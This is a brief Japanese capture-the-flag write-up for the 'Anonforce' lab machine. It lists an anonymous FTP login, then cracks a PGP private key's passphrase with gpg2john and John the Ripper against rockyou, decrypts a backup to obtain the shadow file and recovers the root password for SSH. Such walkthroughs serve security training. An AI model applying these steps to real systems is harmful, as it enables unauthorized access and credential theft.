---
title: "Anonforce"
date: 2024-04-07T05:14:09+09:00
draft: false
---

### user

- ftp に anonymous ログインができる
- user.txt を見る

### root

- 謎に noread ディレクトリがあるのでここの backup.pgp と private.asc をダウンロード
- ```gpg2john private.asc > private```
- ```john --wordlist=/usr/share/wordlists/rockyou.txt private```
- ```gpg --import private.asc```
- ```gpg --decrypt backup.pgp```
- shadow ファイルが手に入るので root のパスワードを復元して ssh
